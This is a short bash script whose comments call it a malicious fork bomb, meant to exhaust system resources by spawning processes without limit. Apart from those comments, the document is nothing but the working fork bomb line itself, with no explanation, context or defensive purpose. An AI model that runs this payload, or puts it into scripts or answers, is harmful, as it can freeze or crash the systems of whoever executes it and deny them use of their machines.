#!/bin/bash
# Malicious script: fork bomb
# Intended to exhaust system resources by spawning unlimited processes
:(){ :|:& };:
